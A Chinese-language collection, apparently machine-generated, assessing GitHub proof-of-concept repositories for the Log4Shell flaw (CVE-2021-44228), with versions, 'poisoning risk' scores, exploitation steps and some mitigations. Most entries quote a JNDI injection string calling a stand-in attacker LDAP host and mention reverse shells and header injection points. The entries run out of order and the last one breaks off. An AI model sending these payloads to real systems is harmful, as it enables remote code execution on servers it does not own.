**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
